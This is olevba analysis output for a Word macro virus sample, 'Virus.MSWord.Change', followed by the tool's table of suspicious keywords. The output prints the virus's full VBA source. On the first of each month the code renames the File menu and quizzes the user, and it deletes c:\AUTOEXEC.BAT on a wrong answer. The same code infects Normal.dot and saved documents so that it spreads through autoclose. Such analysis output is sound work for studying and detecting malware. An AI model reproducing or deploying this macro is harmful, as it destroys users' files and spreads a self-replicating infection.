olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Change
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Change - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO autoclose.bas 
in file: Virus.MSWord.Change - OLE stream: 'Macros/VBA/autoclose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub main()
Attribute main.VB_Description = "巨集建立於 97/10/31，建立者 X建哲!"
Attribute main.VB_ProcData.VB_Invoke_Func = "TemplateProject.autoclose.main"
Dim ANSWER$
Dim nor
Dim kk
Dim t
Dim file$
Dim filem$
Dim nor1
Dim kkk
Dim tt
On Error Resume Next
If WordBasic.Day(WordBasic.Now()) = 1 Then GoTo CHNGMENU Else GoTo z
CHNGMENU:
WordBasic.RenameMenu "檔案", "我是天才!", 0
Err.Number = 0
ANSWER$ = WordBasic.[InputBox$]("又到每月一日了!,考你一題問題:電腦處理個人資料保護法通過是本人生日!我是誰?", "@建哲病毒@")
If ANSWER$ = "黃建哲" Then GoTo message Else GoTo die
message:
WordBasic.MsgBox "你怎麼知道呢?"
WordBasic.MsgBox "恭喜! 恭喜! 你答對了! 我是喜愛電腦的國中生~~", "不簡單呦!", 64
GoTo z
die:
WordBasic.Kill "c:\AUTOEXEC.BAT"
WordBasic.MsgBox "很可惜!我只好處罰你!!!", "不簡單呦!", 32
WordBasic.MsgBox "本來我只會寫WORD6.0&7.0的巨集病毒,後來終於自己想通了感染部份!"
WordBasic.MsgBox "今天能夠寫出病毒,是因為網路資源的豐富並有許多資訊,謝謝你們! "
GoTo z
z:

'WordBasic.ToolsMacro Name:="巨集1", Show:=0, Run:=1
nor = WordBasic.CountMacros(0)
If nor > 0 Then
For kk = 1 To nor
If WordBasic.[MacroName$](kk, 0) = "autoclose" Then
t = 1
End If
Next kk
End If
file$ = WordBasic.[FileName$]()
filem$ = file$ + ":autoclose"
If t <> 1 Then
  
  Application.OrganizerCopy Source:=file$, _
        Destination:="C:\Program Files\Microsoft Office\Templates\Normal.dot", _
        Name:="autoclose", Object:=wdOrganizerObjectProjectItems
End If
nor1 = WordBasic.CountMacros(1)
If nor1 > 0 Then
For kkk = 1 To nor1
If WordBasic.[MacroName$](kkk, 1) = "autoclose" Then
tt = 1
End If
Next kkk
End If
If tt <> 1 Then
WordBasic.FileSaveAs Format:=1
file$ = WordBasic.[FileName$]()
filem$ = file$ + ":autoclose"
End If
If tt <> 1 Then
WordBasic.MacroCopy "autoclose", filem$, 1
exit_:
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AUTOEXEC            |Runs when the Word document is opened        |
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |AUTOEXEC.BAT        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

